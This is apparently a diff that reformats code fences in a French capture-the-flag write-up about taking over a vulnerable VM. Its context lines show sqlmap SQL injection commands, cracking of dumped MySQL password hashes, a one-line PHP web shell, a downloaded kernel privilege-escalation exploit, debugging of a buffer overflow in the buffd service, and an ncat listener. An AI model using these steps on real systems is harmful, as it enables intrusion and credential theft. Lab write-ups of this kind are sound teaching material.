@@ -12,7 +12,7 @@ Comme souvent pas d'indication ni de scénario d'attaque fournit mais uniquement
 
 Un petit scan nous renvoie beaucoup d'informations donc un service inconnu sur le port 7777 :  
 
-```plain
+```
 Nmap scan report for 192.168.1.95
 Host is up (0.000085s latency).
 Not shown: 65528 closed ports
@@ -73,7 +73,7 @@ Sur le port 80 utilisé par Apache on trouve une application de blog PHP-powered
 
 On lance *Wapiti* dessus qui trouve immédiatement des failles SQL dans la page l'authentification et celle de modification du profil (toutes les pages en fait) :  
 
-```plain
+```
 Injection MySQL dans http://192.168.1.95/admin/post.php via une injection dans le paramètre username
 Evil request:
 POST /admin/post.php HTTP/1.1
@@ -115,7 +115,7 @@ A noter qu'aucun mécanisme de cookies n'est présent c'est pour cela que les id
 
 On remplit le formulaire en plaçant une parenthèse dans le champ du nom d'utilisateur comme *Wapiti* l'a fait et on obtient effectivement une erreur quelque peu bavarde :  
 
-```plain
+```
 SELECT * FROM blog_users WHERE poster = 'test')' AND password = ''
 You have an error in your SQL syntax; check the manual that corresponds to your
 MySQL server version for the right syntax to use near ')' AND password = ''' at line 1
@@ -123,7 +123,7 @@ MySQL server version for the right syntax to use near ')' AND password = ''' at 
 
 On pourrait facilement exploiter cette faille à la main tellement l'erreur nous aide mais on va se servir de *sqlmap* pour gagner du temps. On commence par récupérer l'utilisateur courant avec cette commande :  
 
-```plain
+```
 python sqlmap.py -u "http://192.168.1.95/admin/post.php" \
 --data="month=on&date=13&year=on&username=*&password=letmein&time=07%3A08&title=default&entry=on&submit=Submit"\
 --dbms=mysql --current-user
@@ -131,7 +131,7 @@ python sqlmap.py -u "http://192.168.1.95/admin/post.php" \
 
 Le résultat s'affiche sous cette forme :  
 
-```plain
+```
 [18:06:50] [INFO] the back-end DBMS is MySQL
 web server operating system: Linux Debian 5.0 (lenny)
 web application technology: PHP 5.2.6, Apache 2.2.9
@@ -144,7 +144,7 @@ current database:    'blogdb'
 
 L'application web utilise l'utilisateur mysql root... ça envoie du lourd. On continue avec un dump des hashs (*--passwords*) :  
 
-```plain
+```
 debian-sys-maint:5b745a5c3656f410
 root@%:6ff1f95e508abd08
 root:6ff1f95e508abd08
@@ -152,7 +152,7 @@ root:6ff1f95e508abd08
 
 Ces derniers se cassent assez rapidement avec *JTR* :  
 
-```plain
+```
 $ /opt/jtr/john   --format=mysql sqlmaphashes-2eH9R3.txt
 Loaded 3 password hashes with no different salts (MySQL [32/64])
 toorcon          (root@%)
@@ -161,7 +161,7 @@ toorcon          (root)
 
 Après avoir identifié le nom de la base de données (*blogbd*) puis celui des tables (*-D blogbd--tables*) on dumpe le contenu de la table *blog\_users* contenant les infos de connexion de la webapp :  
 
-```plain
+```
 +----+---------+-----------+
 | id | poster  | password  |
 +----+---------+-----------+
@@ -213,7 +213,7 @@ Cela peut se faire via l'ancien *Opera (12.60)* ou les outils de développement 
 
 Comme signature on mettra un code très classique :  
 
-```plain
+```
 <?php system($_GET["cmd"]); ?>
 ```
 
@@ -226,7 +226,7 @@ K is for Kernel, L is for Linux, O is for Old, P is for Pwnable
 
 Tentons d'obtenir un accès root. Le kernel est ancien (2.6.8-2-386) donc ça devrait être aisé. On trouve [un exploit pour une faille dans sock\_sendpage](http://www.exploit-db.com/exploits/9479/) qui fait l'affaire :  
 
-```plain
+```
 sh-2.05b$ wget -O socksend.c http://www.exploit-db.com/download/9479
 --08:41:48--  http://www.exploit-db.com/download/9479
            => `socksend.c'
@@ -280,19 +280,19 @@ Voyons quel est le chemin officiel de terminer ce CTF.
 
 Dans les processus on trouve un exécutable nommé *buffd* qui tourne en tant que root et écoute sur le port 7777 vu en début d'article.  
 
-```plain
+```
 root      3729  0.0  0.1  1556  504 ?        S    07:03   0:00 /usr/local/sbin/buffd
 ```
 
 La commande *file* nous retourne les informations suivantes :  
 
-```plain
+```
 buffd: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.8, not stripped
 ```
 
 On analyse le binaire avec radare2 (commandes *aa* puis *pdf@sym.main*) :  
 
-```plain
+```
 |      |    ; CODE (CALL) XREF from 0x080487a4 (fcn.0804879a)
 |      |    0x08048c95    e80afbffff   call sym.imp.accept
 |      |       sym.imp.accept()
@@ -330,7 +330,7 @@ On analyse le binaire avec radare2 (commandes *aa* puis *pdf@sym.main*) :
 
 Du très classique avec un bind / listen / accept / fork... Voyons ce qu'on a plus loin.  
 
-```plain
+```
 |      |    0x08048d61    c744240c000. mov dword [esp+0xc], 0x0
 |      |    0x08048d69    89442408     mov [esp+0x8], eax
 |      |    0x08048d6d    8d858cfeffff lea eax, [ebp-0x174]
@@ -366,7 +366,7 @@ Le programme envoie une chaîne au client, en reçoit une puis la passe à une f
 
 Mystère mystère, que peut donc bien faire cette fonction ?  
 
-```plain
+```
 [0x080488e0]> pdf@sym.vulnerable
 |          ; CODE (CALL) XREF from 0x08048dc5 (unk)
 / (fcn) sym.vulnerable 29
@@ -387,7 +387,7 @@ Surprise ! Un classique buffer-overflow via l'utilisation de *strcpy*. Le buffer
 
 En plus l'ASRL n'est pas activé car les adresses des librairies sont les même d'une exécution à l'autre :  
 
-```plain
+```
 sh-2.05b# ldd /bin/cat
         linux-gate.so.1 =>  (0xffffe000)
         libc.so.6 => /lib/libc.so.6 (0x40022000)
@@ -404,7 +404,7 @@ Comme le programme fork() à chaque client il est préférable de se connecter d
 
 Comme le process se met en pause au rattachement on le remet en marche via *'c'* ou *'continue'* puis on envoie une chaîne de test (un max de A par exemple) :  
 
-```plain
+```
 (gdb) attach 10340
 (gdb) c
 Continuing.
@@ -444,7 +444,7 @@ print "A"*124 + "B" * 4 + "C" * 4 + "D" * 4 + "E" * 4 + "F" * 4
 
 Cette fois le résultat est particulièrement instructif :  
 
-```plain
+```
 (gdb) c
 Continuing.
 
@@ -477,7 +477,7 @@ On voit qu'il faut 124 caractères avant d'écraser l'adresse de retour. On rema
 
 On va donc chercher un gadget dans le binaire du type *jmp eax* ou *call eax* qui nous donnera un point de relais stable vers notre shellcode. *objdump* à la rescousse !  
 
-```plain
+```
 objdump -d buffd | egrep '.*call.*eax$'
  804898f:       ff d0                   call   *%eax
  8048efb:       ff d0                   call   *%eax
@@ -508,7 +508,7 @@ s.close()
 
 Qu'est-ce que ça donne ?  
 
-```plain
+```
 $ ls -l /etc/shadow
 -rw-r----- 1 root shadow 719 2014-04-13 12:35 /etc/shadow
 $ python sploit.py 
@@ -541,7 +541,7 @@ Sending large buffer, please wait...
 
 On aura préalablement mis en place un *SimpleHTTPServer* ainsi qu'un *ncat* :  
 
-```plain
+```
 > ncat -l -p 8888 -v
 Ncat: Version 6.01 ( http://nmap.org/ncat )
 Ncat: Listening on :::8888
